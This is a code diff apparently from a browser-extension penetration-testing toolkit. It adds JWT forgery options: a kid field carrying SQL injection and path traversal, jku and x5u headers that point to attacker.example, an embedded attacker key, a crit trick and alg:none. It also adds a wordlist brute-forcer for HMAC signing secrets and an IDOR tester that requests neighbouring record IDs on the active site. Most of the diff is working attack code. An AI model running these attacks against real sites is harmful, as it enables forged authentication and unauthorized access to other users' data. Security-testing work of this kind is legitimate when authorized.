+          <details style="font-size:9px;color:var(--text-muted);flex:1"><summary style="cursor:pointer">+ extra wordlist</summary><textarea class="tool-input mt-4" id="jwt-crack-extra" rows="2" placeholder="One key per line"></textarea></details>
+        </div>
+        <div id="jwt-crack-out" style="display:none;margin-bottom:8px"></div>
         <textarea class="tool-input mt-6" id="jwt-result" rows="2" readonly placeholder="Modified token…"></textarea>`;
 
       const b64url = (s) => btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
@@ -2336,12 +2723,30 @@ function toolJwtEditor() {
         try {
           const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
           const newHeader = { ...header };
+          let unsigned = true;  // Most attacks fall back to alg:none for the dev to verify
           switch (btn.dataset.he) {
             case 'kid-sqli': newHeader.kid = "' UNION SELECT 'secret' --"; break;
             case 'kid-path': newHeader.kid = '../../../../dev/null'; break;
             case 'kid-empty': newHeader.kid = ''; break;
+            case 'jku':
+              newHeader.jku = 'https://attacker.example/.well-known/jwks.json';
+              break;
+            case 'jwk-embed':
+              // Vulnerable JWT libs verify the token using a public key embedded in the header.
+              // Below is a placeholder JWK — replace e/n with attacker-controlled key for live testing.
+              newHeader.jwk = { kty: 'RSA', kid: 'attacker', use: 'sig', alg: 'RS256', n: 'REPLACE_WITH_ATTACKER_MODULUS_BASE64URL', e: 'AQAB' };
+              break;
+            case 'x5u':
+              newHeader.x5u = 'https://attacker.example/cert.pem';
+              break;
+            case 'crit':
+              // crit declares headers the verifier must understand. Some libs silently ignore the
+              // requirement, allowing claims to be present in the header but skipped on verify.
+              newHeader.crit = ['exp'];
+              newHeader.exp = 0;
+              break;
           }
-          newHeader.alg = 'none';
+          if (unsigned) newHeader.alg = 'none';
           const token = b64url(JSON.stringify(newHeader)) + '.' + b64url(JSON.stringify(newPayload)) + '.';
           out.querySelector('#jwt-result').value = token;
           log('JWT header attack: ' + btn.dataset.he, 'info');
@@ -2355,6 +2760,24 @@ function toolJwtEditor() {
         } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
       });
       out.querySelector('#jwt-copy')?.addEventListener('click', () => { copyText(out.querySelector('#jwt-result').value); });
+      out.querySelector('#jwt-crack')?.addEventListener('click', async () => {
+        const ck = out.querySelector('#jwt-crack-out');
+        const btn = out.querySelector('#jwt-crack');
+        ck.style.display = 'block';
+        ck.innerHTML = '<div class="loading-text"><span class="spinner"></span> Trying common keys via SubtleCrypto HMAC…</div>';
+        btn.disabled = true; btn.textContent = 'Cracking…';
+        const extra = out.querySelector('#jwt-crack-extra')?.value || '';
+        const r = await chrome.runtime.sendMessage({ type: 'JWT_BRUTEFORCE', token, domain: activeTabDomain, extra });
+        btn.disabled = false; btn.textContent = '▶ Try common keys';
+        if (!r.ok) { ck.innerHTML = errMsg(r.error); return; }
+        if (r.found) {
+          ck.innerHTML = `<div class="result-item high"><div class="result-label"><span class="result-tag tag-high">CRACKED</span> ${esc(r.alg)} secret recovered</div><div class="result-value">Key: <code style="background:var(--accent-soft);padding:2px 6px;border-radius:3px">${esc(r.key)}</code><br>Found after ${r.attempted} attempts.</div></div>`;
+          log('JWT cracked: ' + r.key, 'success');
+        } else {
+          ck.innerHTML = `<div class="result-item info"><div class="result-label">No match</div><div class="result-value">Tried ${r.attempted}/${r.totalKeys} common keys against ${esc(r.alg)}. The signing secret is not in the wordlist. Try a longer wordlist or a real cracker like jwt_tool with rockyou.txt.</div></div>`;
+          log('JWT crack: no match in ' + r.attempted + ' keys', 'info');
+        }
+      });
     } catch (e) { out.innerHTML = errMsg('JWT decode failed: ' + e.message); }
   });
 }
@@ -2514,11 +2937,60 @@ async function toolIdor() {
 
   if (!findings.length) {
     b.innerHTML = '<div class="text-xs text-muted mb-4">Page: ' + esc(activeTabUrl) + '</div><div class="text-muted text-sm">No IDOR candidates in URL, XHR, or page links</div>';
-    finalizeResults('discovery'); return;
+    finalizeResults('offensive'); return;
   }
   b.innerHTML = '<div class="text-xs text-muted mb-4">Page: ' + esc(activeTabUrl) + '</div><div class="text-sm mb-6">' + findings.length + ' potential IDOR parameters</div>' +
-    findings.map(f => '<div class="result-item ' + (f.priority === 'high' ? 'high' : 'medium') + '" style="cursor:pointer"><div class="result-label"><span class="result-tag tag-' + (f.priority === 'high' ? 'high' : 'medium') + '">' + esc(f.type) + '</span> ' + esc(f.source) + '</div><div class="result-value">' + esc(f.param) + ' = ' + esc(f.value) + '</div>' + (f.url ? '<div class="text-xs text-muted">' + esc(f.url).slice(0, 100) + '</div>' : '') + '<div class="text-xs mt-4" style="color:var(--warning)">Try: ' + f.suggest.map(s => '<code style="background:var(--surface-hover);padding:1px 4px;border-radius:2px">' + esc(s) + '</code>').join(' ') + '</div>' + (f.predictability ? '<div class="text-xs text-muted mt-4">\ud83d\udcca ' + esc(f.predictability) + '</div>' : '') + '</div>').join('');
-  finalizeResults('discovery');
+    findings.map((f, i) => '<div class="result-item ' + (f.priority === 'high' ? 'high' : 'medium') + '" style="cursor:pointer"><div class="result-label"><span class="result-tag tag-' + (f.priority === 'high' ? 'high' : 'medium') + '">' + esc(f.type) + '</span> ' + esc(f.source) + '</div><div class="result-value">' + esc(f.param) + ' = ' + esc(f.value) + '</div>' + (f.url ? '<div class="text-xs text-muted">' + esc(f.url).slice(0, 100) + '</div>' : '') + '<div class="text-xs mt-4" style="color:var(--warning)">Try: ' + f.suggest.map(s => '<code style="background:var(--surface-hover);padding:1px 4px;border-radius:2px">' + esc(s) + '</code>').join(' ') + '</div>' + (f.predictability ? '<div class="text-xs text-muted mt-4">📊 ' + esc(f.predictability) + '</div>' : '') + (f.type === 'numeric' && f.url ? '<button class="btn-sm idor-test mt-4" data-idor-idx="' + i + '" style="font-size:9px;padding:2px 8px">▶ Auto-test ±1</button><div class="idor-result" data-idor-out="' + i + '" style="display:none;margin-top:6px;padding:6px;background:var(--surface-hover);border-radius:4px;font-family:var(--font-mono);font-size:9px"></div>' : '') + '</div>').join('');
+  finalizeResults('offensive');
+
+  // Wire auto ±1 test buttons
+  b.querySelectorAll('.idor-test').forEach(btn => btn.addEventListener('click', async (ev) => {
+    ev.stopPropagation();
+    const idx = +btn.dataset.idorIdx;
+    const f = findings[idx];
+    const out = b.querySelector('[data-idor-out="' + idx + '"]');
+    out.style.display = 'block';
+    out.innerHTML = '<span class="loading-text"><span class="spinner"></span> Firing 4 requests…</span>';
+    try {
+      const baseUrl = f.url;
+      const baseVal = f.value;
+      const tests = [];
+      // Build URLs for ±1, 0, 1
+      for (const newVal of f.suggest) {
+        try {
+          let testUrl;
+          // If the IDOR was in a query param, replace it; if in path, replace inline
+          const u = new URL(baseUrl);
+          if (u.searchParams.has(f.param)) {
+            u.searchParams.set(f.param, newVal);
+            testUrl = u.toString();
+          } else {
+            // Path replacement — replace last occurrence of the value in pathname
+            testUrl = baseUrl.replace(baseVal, newVal);
+          }
+          tests.push({ val: newVal, url: testUrl });
+        } catch {}
+      }
+      // Fire baseline + tests in parallel
+      const baseline = await chrome.runtime.sendMessage({ type: 'FETCH_URL', url: baseUrl });
+      const results = await Promise.all(tests.map(async t => {
+        try {
+          const r = await chrome.runtime.sendMessage({ type: 'FETCH_URL', url: t.url });
+          return { val: t.val, url: t.url, status: r.status, len: (r.text || '').length };
+        } catch (e) { return { val: t.val, url: t.url, error: e.message }; }
+      }));
+      const baseLen = (baseline.text || '').length;
+      out.innerHTML = '<div style="margin-bottom:4px">Baseline: ' + baseline.status + ' · ' + baseLen + 'b</div>' +
+        results.map(r => {
+          if (r.error) return '<div style="color:var(--text-muted)">' + esc(r.val) + ': error — ' + esc(r.error) + '</div>';
+          const lenDiff = Math.abs(r.len - baseLen);
+          const interesting = r.status === 200 && lenDiff < 100 && r.val !== baseVal;
+          const blocked = r.status === 401 || r.status === 403 || r.status === 404;
+          const style = interesting ? 'color:var(--accent);font-weight:600' : blocked ? 'color:var(--text-muted)' : '';
+          return '<div style="' + style + '">' + esc(r.val) + ': ' + r.status + ' · ' + r.len + 'b (Δ' + lenDiff + 'b)' + (interesting ? ' ← worth investigating' : '') + '</div>';
+        }).join('');
+    } catch (e) { out.innerHTML = errMsg(e.message); }
+  }));
 }
 
 // ═══ LIVE BROWSE ═══
